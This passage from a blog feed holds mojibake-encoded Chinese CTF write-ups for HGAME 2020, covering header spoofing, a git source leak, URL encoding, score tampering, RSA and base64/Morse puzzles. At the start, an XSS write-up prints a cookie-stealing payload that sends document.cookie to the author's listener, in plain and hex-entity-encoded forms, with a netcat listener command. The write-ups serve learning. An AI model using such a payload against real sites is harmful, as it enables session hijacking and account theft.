class="javascript">window.location.href=&quot;vpsip:port/?s=&quot;+document.cookie;</code></pre><p>æ‰€ä»¥æ˜ç™½äº†è·å–cookieçš„payloadæ ¼å¼ã€‚é‚£ä¹ˆå¯¹æ­¤é¢˜ï¼Œæˆ‘ä»¬çš„ç†æƒ³payloadå°±æ˜¯</p><pre><code class="javascript">&lt;svg/onload=&quot;window.location.href=&quot;ip:7788/?s=&quot;+document.cookie;&quot;&gt;</code></pre><p>è¿™é‡Œæˆ‘å‡ºäºéšç§æŠŠè‡ªå·±çš„ipæ»¤æ‰ï¼Œåªæ˜¾ç¤ºæˆ‘ç›‘å¬çš„æ˜¯7788ç«¯å£ã€‚</p><p>é‚£ä¹ˆç¼–ç ï¼Œå»å°–æ‹¬å·åï¼Œæˆ‘ä»¬å®é™…æäº¤çš„payloadä¸ºï¼š(è¿™é‡Œæˆ‘æŠŠipæ¢æˆ127.0.0.1)</p><pre><code class="javascript">&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;</code></pre><p>åœ¨é¢˜ç›®ç•Œé¢æäº¤åæˆ‘ä»¬çœ‹çœ‹æœ‰æ²¡æœ‰æˆåŠŸæ’å…¥<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/14.jpg" class="lazyload" data-srcset="14.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="message payload"><br>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶å›æ˜¾æ˜¾ç¤ºçš„ä¸€ä¸ªæ— å†…å®¹çš„æ–¹æ¡†ã€‚ä½†æˆ‘çš„payloadè¢«æˆåŠŸè§£æã€‚<br>åŒæ—¶åœ¨vpsä¸Šç›‘å¬ç«¯å£7788</p><pre><code>nc -lvp 7788</code></pre><p>æäº¤è„šæœ¬è·‘å‡ºæ¥çš„codeï¼Œæ”¶åˆ°Successçš„åŒæ—¶æŸ¥çœ‹æœåŠ¡å™¨<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/15.jpg" class="lazyload" data-srcset="15.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>æˆåŠŸå¸¦å‡ºtokenã€‚é‚£ä¹ˆç”¨bpæ¢tokenè®¿é—®/flagå§ã€‚<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/16.jpg" class="lazyload" data-srcset="16.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><p>è¿™é“é¢˜çœŸçš„èŠ±äº†å¾ˆä¹…ã€‚æ¯•ç«Ÿè‡ªå·±åœ¨æ­¤ä¹‹å‰æ²¡æ¥è§¦è¿‡ä¸€é“xssæ‰“cookieçš„çœŸé¢˜ã€‚ä½†æ˜¯è¿˜æ˜¯é ç€ç½‘ä¸ŠçŸ¥è¯†å­¦åˆ°äº†è®¸å¤šï¼ŒæˆåŠŸæ‹¿åˆ°è‡ªå·±çš„flagã€‚æ‰€ä»¥è¦å¤šå¤šå‘å„ä½dalaoä»¥åŠç™¾åº¦è°·æ­Œå­¦ä¹ å•Šã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­ç”µhgame-week1</title>
      <link href="2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/"/>
      <url>2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/</url>
      
        <content type="html"><![CDATA[<p>   èŒæ–°çš„ç¬¬ä¸€æ¬¡hgameå¼€å§‹äº†ã€‚week1çš„éš¾åº¦æ¯”è¾ƒå‹å¥½ï¼Œè‡³å°‘ä»webä¸Šæ¥è¯´æ˜¯è¿™æ ·çš„ï¼Œè‡ªå·±ç›®æ ‡ä¹Ÿä¸é«˜ï¼Œäº‰å–åšåˆ°æ¯ä¸ªweekèƒ½akwebå°±æ»¡è¶³äº†ã€‚è¿™æ¬¡çš„webæ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œé™¤äº†æˆ‘è‡ªå·±è¢«å‘åˆ°çš„codeworldï¼ˆä¸­é—´å±…ç„¶è¢«banäº†ip,æˆ‘åªæ˜¯ç”¨è„šæœ¬postäº†ä¸€æ¬¡ ï¼Œæ²¡æ‹¿æ‰«æå™¨æ‰«å•Šå•Šå•Šï¼‰å‰©ä¸‹çš„3é¢˜åŠ èµ·æ¥åŸºæœ¬1å°æ—¶ä»¥å†…å°±èƒ½åšå®Œhhã€‚é™¤æ­¤ä¹‹å¤–è¿˜è¯•äº†è¯•å¯†ç å­¦è·Ÿmiscçš„ç®€å•é¢˜ï¼Œä¹Ÿéƒ½å†™ä¸€å†™è¿‡ç¨‹å§ã€‚ï¼ˆå¦å¤–ä½“ä¼šåˆ°re,pwnçœŸçš„æ˜¯çˆ¸çˆ¸ï¼Œçˆ·çˆ·ï¼Œæ’åé«˜çš„åŸºæœ¬éƒ½æ˜¯äºŒè¿›åˆ¶çš„â€¦â€¦,æˆ‘ä»€ä¹ˆæ—¶å€™æ‰èƒ½å­¦ä¼šäºŒè¿›åˆ¶å•Šï¼‰</p><p>çœ‹åˆ°å®˜æ–¹å‘å¸ƒäº†æ‰å‘çš„ï¼Œé‚£å°±è´´ä¸‹å®˜æ–¹çš„ï¼š<a href="https://github.com/vidar-team/Hgame2020_writeup" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup</a></p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h2><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git"><br>æ˜¾ç„¶æç¤ºçš„æ˜¯æºç æ³„éœ²ã€‚é‚£ä¹ˆå°±æœæ–­GitHackèµ°èµ·ã€‚å¯æ˜¯æ‹¿ä¸‹æ¥çš„ç»“æœåªæœ‰index.htmlä¸cssæ–‡ä»¶ã€‚è¿™æ—¶å€™ä¸€å¼€å§‹æˆ‘é™·å…¥äº†é”™è¯¯çš„æƒ³æ³•ï¼Œå…·ä½“å‚è€ƒåŸæ¥ichunqiuä¸Šåšè¿‡çš„â€˜ç™»é™†â€™ä¸€é¢˜ã€‚äºæ˜¯æˆ‘ä½¿ç”¨äº†èƒ½å¤Ÿå›æ»šçš„githackï¼Œåœ¨å®ƒçˆ¬ä¸‹çš„objectsé‡Œä¸€ä¸ªä¸ªæ‰¾ï¼ˆå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼‰</p><pre><code>git  cat-file -p /ä¸¤ä½æ•°/æ–‡ä»¶å</code></pre><p>æŸ¥çœ‹å®Œæ‰€æœ‰objectsä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œé™¤äº†å‡ºé¢˜äººçš„githubâ€¦â€¦é‚£ä¹ˆæ˜¯å¦æ˜¯å†å²å›æ»šå‘¢ï¼Ÿä½†ç”¨gitæ‰¾å´åªæ‰¾åˆ°ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ„Ÿè§‰ä¸å¤ªå¯¹åŠ²ã€‚é‚£å°±ä¸Šgithubä¸Šæ‰¾æ‰¾å§â€¦â€¦ç»“æœè¿˜çœŸæœ‰ã€‚<img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="commit"><br>ä¸‹é¢çš„ç‰ˆæœ¬ä¸­å°±æœ‰flagçš„base64ç¼–ç </p><h2 id="æ¥å¤´éœ¸ç‹"><a href="#æ¥å¤´éœ¸ç‹" class="headerlink" title="æ¥å¤´éœ¸ç‹"></a>æ¥å¤´éœ¸ç‹</h2><p>é¢˜ç›®ä¸Šæ¥æ²¡å•¥æç¤ºï¼Œé™¤äº†ä¸€å¼ æ¥å¤´éœ¸ç‹çš„å›¾ç‰‡è·Ÿyou need to come from vidar.club<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å¤´"></p><p>è¦è¯´webé‡Œè·Ÿå¤´æœ‰å…³çš„ï¼Œé‚£åªèƒ½æ˜¯æŠ“åŒ…é‡Œå¸¸è§çš„Headeräº†ã€‚åŠ ä¸Šcome from æŸä¸ªç½‘å€ï¼Œä¸éš¾çŸ¥é“å°±æ˜¯http Headerä¸­refererè¿™ä¸ªå±æ€§ã€‚è¿™ä¸ªå±æ€§ä¹‹æ‰€ä»¥æœ‰åï¼Œè·Ÿå®ƒå°†é”™å°±é”™çš„æ‹¼å†™æœ‰å…³ï¼Œæ­£ç¡®æ‹¼å†™æ˜¾ç„¶æ˜¯referrer,è€Œè¿™ä¸ªé”™è¯¯æ‹¼å†™æ˜¯æ—©æœŸè§„èŒƒçš„é”™è¯¯å› ä¸ºå‘åå…¼å®¹é—ç•™è‡³ä»Šçš„ã€‚å…¶ä½œç”¨æ˜¯å‘Šè¯‰æœåŠ¡å™¨æˆ‘ä»¬è®¿é—®è€…æ˜¯ä»å“ªé“¾æ¥è¿‡æ¥çš„ï¼Œä»è€Œè¿›è¡ŒåŒºåˆ«å¤„ç†ã€‚<br>é‚£ä¹ˆå…ˆåŠ refererå¤´<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="referer"></p><p>æç¤ºè¦ä»æœ¬åœ°è®¿é—®ï¼Œé‚£å°±æ›´ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œå› ä¸ºè¿™ç”¨åˆ°å·²ç»çƒ‚ç†Ÿäºå¿ƒçš„XFFå¤´äº†ã€‚å¸¸å¸¸ç”¨äºä¼ªé€ ipã€‚æ‰€ä»¥æˆ‘ä»¬ä»¤XFFå¤´ä¸º127.0.0.1.<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xff"><br>æç¤ºæ”¹æµè§ˆå™¨ï¼Œé‚£åªéœ€æ”¹User-Agent å¤´ï¼ŒåŠ ä¸Šcosmoså³å¯ã€‚<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="user-agent"><br>flagè¦åœ¨2077åæ›´æ–°ï¼Ÿä¸€çœ‹åˆ°2077æˆ‘å°±æƒ³åˆ°å»å¹´æ–°æ‰‹ä¸Šåœºçš„ä¸­ç§‘å¤§hackergameé‡Œçš„ä¿¡æ¯å®‰å…¨2077ï¼Œé‚£é“é¢˜å°±æ˜¯é€šè¿‡æ”¹headerä¸­ä¸€ä¸ªå±æ€§æ¥æ‹¿flagã€‚è¿™é“é¢˜åº”è¯¥ä¹Ÿä¸€æ ·å§â€¦â€¦é‚£ä¹ˆæˆ‘ä»¬è¦æ”¹ä»€ä¹ˆå±æ€§å‘¢ï¼Ÿå…ˆæ¥çœ‹çœ‹response:<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Last-Modified"><br>æ³¨æ„åˆ°æœ‰Last-Moifiedè¿™ä¸€å±æ€§ï¼Œè€Œrequestsçš„è¯·æ±‚å¤´ä¸­ä¸ä¹‹å¯¹åº”çš„å°±æ˜¯If-Unmodifed-Since,å…¶å®˜æ–¹è§£é‡Š</p><blockquote><p>HTTPåè®®ä¸­çš„ <strong><code>If-Unmodified-Since</code></strong> æ¶ˆæ¯å¤´ç”¨äºè¯·æ±‚ä¹‹ä¸­ï¼Œä½¿å¾—å½“å‰è¯·æ±‚æˆä¸ºæ¡ä»¶å¼è¯·æ±‚ï¼šåªæœ‰å½“èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åæ²¡æœ‰è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ‰ä¼šè¿”å›è¯·æ±‚çš„èµ„æºï¼Œæˆ–æ˜¯æ¥å— <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener" title="HTTP POST æ–¹æ³• å‘é€æ•°æ®ç»™æœåŠ¡å™¨. è¯·æ±‚ä¸»ä½“çš„ç±»å‹ç”± Content-Type é¦–éƒ¨æŒ‡å®š."><code>POST</code></a> æˆ–å…¶ä»– non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener" title="safe: An HTTP method is safe if it doesn&#39;t alter the state of the server. In other words, a method is safe if it leads to a read-only operation. Several common HTTP methods are safe: GET, HEAD, or OPTIONS. All safe methods are also idempotent, but not all idempotent methods are safe. For example, PUT and DELETE are both idempotent but unsafe.">safe</a> æ–¹æ³•çš„è¯·æ±‚ã€‚å¦‚æœæ‰€è¯·æ±‚çš„èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åå‘ç”Ÿäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆä¼šè¿”å› <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412" target="_blank" rel="noopener" title="åœ¨ HTTP åè®®ä¸­ï¼Œå“åº”çŠ¶æ€ç  412 Precondition Failedï¼ˆå…ˆå†³æ¡ä»¶å¤±è´¥ï¼‰è¡¨ç¤ºå®¢æˆ·ç«¯é”™è¯¯ï¼Œæ„å‘³ç€å¯¹äºç›®æ ‡èµ„æºçš„è®¿é—®è¯·æ±‚è¢«æ‹’ç»ã€‚è¿™é€šå¸¸å‘ç”Ÿäºé‡‡ç”¨é™¤ GET å’Œ HEAD ä¹‹å¤–çš„æ–¹æ³•è¿›è¡Œæ¡ä»¶è¯·æ±‚æ—¶ï¼Œç”±é¦–éƒ¨å­—æ®µ If-Unmodified-Since æˆ– If-None-Match è§„å®šçš„å…ˆå†³æ¡ä»¶ä¸æˆç«‹çš„æƒ…å†µä¸‹ã€‚è¿™æ—¶å€™ï¼Œè¯·æ±‚çš„æ“ä½œâ€”â€”é€šå¸¸æ˜¯ä¸Šä¼ æˆ–ä¿®æ”¹æ–‡ä»¶â€”â€”æ— æ³•æ‰§è¡Œï¼Œä»è€Œè¿”å›è¯¥é”™è¯¯çŠ¶æ€ç ã€‚"><code>412</code></a> (Precondition Failed) é”™è¯¯ã€‚</p></blockquote><p>æ‰€ä»¥æ”¹å¥½æ—¶é—´åœ¨2077ä¹‹åï¼š<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/8.jpg" class="lazyload" data-srcset="8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="If-Unmodified-Since"></p><h2 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h2><p>  è¿™é“é¢˜åšå‡ºæ¥çš„äººæ•°ç®—æ˜¯æ‰€æœ‰webé‡Œé¢æœ€å°‘çš„äº†,ä½†æ˜¯è‡ªå·±ä¸€å¼€å§‹å‚»å‚»çš„å¡äº†å¥½ä¹…â€¦â€¦<br>  å¼€å§‹ä¸€ä¸ª403,ä¸è¿‡ä½œä¸ºctfer,åƒä¸‡ä¸è¦ç›¸ä¿¡è¿™ä¸ª403æ˜¯çœŸæ­£çš„403ï¼Œé‚£ä¹ˆå…ˆæŠ“ä¸ªåŒ…ï¼Œæœä¸å…¶ç„¶<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/9.jpg" class="lazyload" data-srcset="9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="302"><br>æç¤ºå­˜åœ¨302ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—®index.phpå§ï¼ŒæŠ“åŒ…åå‘è‡³repeaterå‘ç°å­˜åœ¨405,é‚£ä¹ˆæœæ–­æ”¹æˆPOSTè¯·æ±‚æ–¹å¼ï¼Œå¾—åˆ°ï¼š<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/10.jpg" class="lazyload" data-srcset="10.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="äººæœºéªŒè¯"></p><p>é‚£ä¹ˆæç¤ºé€šè¿‡urlä¼ å€¼ï¼Œé‚£æœæ–­ä¼ <code>/?a=5+5</code>å•Šï¼Œç»“æœè¿”å›è¯´â€œå†æƒ³æƒ³â€ã€‚è‡ªå·±é¡¿æ—¶é™·å…¥è¿·èŒ«ï¼Œä¸€å¼€å§‹æƒ³æ˜¯ä¸æ˜¯ä¸æ˜¯ç”¨+è¿æ¥ï¼Œåæ¥åˆæƒ³ï¼ŒåŸºäºé¢˜ç›®æ˜¯codeworldï¼Œæ˜¯ä¸æ˜¯è¦ä»£ç æ‰§è¡Œ?ä½†æ˜¯fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶æ²¡æœ‰å›æ˜¾æ‰§è¡Œçš„ç‚¹ã€‚äºæ˜¯é™·å…¥è¿·èŒ«ã€‚åæ¥ï¼Œè‡ªå·±åœ¨æ£€æŸ¥è‡ªå·±æŠ“çš„åŒ…æ—¶ï¼Œæ„å¤–å‘ç°äº†ä¸€ç‚¹ï¼š<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/11.jpg" class="lazyload" data-srcset="11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="getä¼ å€¼"><br>å¯¹äº†ï¼åœ¨è¿›è¡Œgetä¼ å€¼æ—¶ï¼Œä»–ä¼šæŠŠåŠ å·å¤„ç†æˆç©ºã€‚ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œé¢˜ç›®æ‰ä¼šè¦æ±‚urlä¼ å€¼å¹¶ä½¿ç”¨ç›¸åŠ è¿™ç§æ–¹å¼æ¥è®¾ç½®é™å®šã€‚æ‰€ä»¥payloadå³ä¸º</p><pre><code>/?a=5%2B5</code></pre><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/12.jpg" class="lazyload" data-srcset="12.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h2 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h2><p>æ¸¸æˆé¢˜hhhä½†ä»æ¸¸æˆè§’åº¦è¿‡åˆ†éš¾äº†ã€‚æ˜¾ç„¶æ¸¸æˆåªæ˜¯å¹Œå­ï¼Œåº”è¯¥æ‰¾åˆ°ç½‘ç«™é‡Œèƒ½postå€¼çš„æ“ä½œï¼Œäºæ˜¯å°è¯•ç‹‚ç‚¹â€˜å¼€å§‹æ¸¸æˆâ€™ï¼Œæœç„¶æç¤ºéœ€è¦300000åˆ†æ—¶æŠ“åˆ°poståŒ…ã€‚æ”¹åŒ…å°±å¥½ã€‚<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/13.jpg" class="lazyload" data-srcset="13.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h2><p>æœ‰ç”Ÿä¹‹å¹´è¿˜èƒ½åšå‡ºRSAâ€¦â€¦å› ä¸ºçœ‹åˆ°RSAå‡ ä¸ªå‚æ•°æç¤ºçš„å¾ˆæ¸…æ¥šå°±å¹²è„†å»ç½‘ä¸Šå«–è„šæœ¬äº†ã€‚åœ¨è£…åº“çš„æ—¶å€™å°±å¾ˆæ— å¥ˆï¼Œgmpy2æ€»æ˜¯å¼„ä¸å¥½ã€‚æœ€åå»æ‰¾äº†ä¸ªwhlï¼Œpip installä¸‹æ€»å½’èƒ½ç”¨äº†</p><pre><code class="python">import gmpy2import binasciip = gmpy2.mpz(681782737450022065655472455411)q = gmpy2.mpz(675274897132088253519831953441)e = gmpy2.mpz(13)phi_n = (p-1)*(q-1)d = gmpy2.invert(e, phi_n)c = gmpy2.mpz(275698465082361070145173688411496311542172902608559859019841)m = pow(c, d, p*q)print(&quot;åè¿›åˆ¶:\n%s&quot;%m)m_hex = hex(m)[2:]print(&quot;åå…­è¿›åˆ¶:\n%s&quot;%(m_hex,))#print(&quot;ascII:\n%s&quot;%((binascii.b2a_hex(hex(m)[2:])).decode(&#39;hex&#39;),))print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))</code></pre><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/14.jpg" class="lazyload" data-srcset="14.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="RSA"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h2><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>ä¸€å¼€å§‹ä¸å¤ªæ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆç¼–ç ï¼Œåæ¥ç™¾åº¦ä¸€ä¸‹å‘ç°å°±æ˜¯base64ã€‚å›å¤´æƒ³æƒ³ï¼Œå‘ç°æ¯•ç«Ÿæ˜¯æ•°å­—+å­—æ¯çš„ç»„åˆï¼Œå¯ä»¥è€ƒè™‘baseç³»çš„ç¼–ç ã€‚<br>è§£ç åä¸ºmorseç”µç ï¼Œåœ¨çº¿è§£ä¸€ä¸‹å°±å¥½äº†ã€‚</p><h2 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h2><p>é¢˜ç›®ä¸‹ä¸‹æ¥æ‰“å¼€æ˜¯ä¸ªå›¾ç‰‡ï¼Œæ‰”winhexé‡Œçœ‹å‘ç°æœ«å°¾æç¤ºflag.txtä»¥åŠå¯†ç æ˜¯å›¾ç‰‡idï¼Œå›¾ç‰‡ååˆ™æ 